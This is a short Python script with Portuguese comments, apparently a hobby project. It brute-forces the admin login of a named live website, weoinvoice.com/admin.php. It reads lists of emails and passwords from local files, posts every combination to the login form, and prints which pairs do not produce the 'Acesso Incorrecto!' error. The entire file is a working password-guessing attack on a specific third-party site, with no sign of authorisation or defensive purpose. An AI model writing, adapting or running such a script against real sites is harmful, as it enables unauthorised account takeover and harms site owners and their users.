import requests

url = 'https://www.weoinvoice.com/admin.php'
textrun = requests.get(url)
#print(textrun.text)
#input('aperte enter para continuar ...')
#passw and email
op_email = open("C:\\Users\\pedro\\Projetos_Programação\\Projetos Abertos\\python-projects\\Requests\\.E.txt")
op_passw = open("C:\\Users\\pedro\\Projetos_Programação\\Projetos Abertos\\python-projects\\Requests\\.p.txt")
email = (op_email.readlines())
passw = (op_passw.readlines())
teste = requests.get(url)
textt = teste.text
print(textt)
input()
try: 
    for x in range(1, len(email)+1):
        #primeiro for, feito a troca de email

        for a in range(1, len(passw)+1):
            #segundo for, feito a troca de senha, tentativas por email
            payload = {'email': email[x-1].replace('\n',''), 'password':passw[a-1].replace('\n','')}
            requees = requests.post(url, data=payload)
            texto = requees.text
            print(texto)
            input()
            if 'Acesso Incorrecto!' in texto:
                print('email {} and password {} Invalido\n'.format(email[x-1].replace('\n',''),passw[a-1].replace('\n','')))
            else:
                print('email {} and password {} Valido'.format(email[x-1].replace('\n',''),passw[a-1].replace('\n','')))

    
except KeyboardInterrupt:
    print('Programa encerrado')
print('fim')